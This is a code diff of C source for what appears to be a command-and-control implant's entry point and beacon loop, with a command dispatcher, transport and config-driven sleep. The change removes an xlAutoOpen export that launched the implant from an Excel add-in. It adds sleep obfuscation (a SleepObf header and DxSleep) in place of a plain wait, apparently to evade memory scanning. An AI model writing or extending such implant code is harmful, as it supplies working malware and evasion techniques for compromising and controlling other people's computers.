@@ -3,22 +3,14 @@
 
 #include <Core/Command.h>
 #include <Core/WinUtils.h>
-#include "Common/Defines.h"
+#include <Common/Defines.h>
 #include <Core/Transport.h>
+#include <Core/SleepObf.h>
 
 HINSTANCE hAppInstance  = NULL;
 PINSTANCE Instance      = & ( ( PINSTANCE ) { 0 } );
 
 VOID Start(  );
-
-#ifdef DLL_XLL
-DLLEXPORT INT WINAPI xlAutoOpen(  )
-{
-    Start();
-
-    return 0;
-}
-#endif
 
 DLLEXPORT VOID Start(  )
 {
@@ -41,7 +33,7 @@ DLLEXPORT VOID Start(  )
                 CommandDispatcher();
         }
 
-        Instance->Win32.WaitForSingleObjectEx( NtCurrentThread(), Instance->Config.Sleeping * 1000, FALSE );
+        DxSleep( Instance->Config.Sleeping * 1000 );
     } while ( TRUE );
 }
 
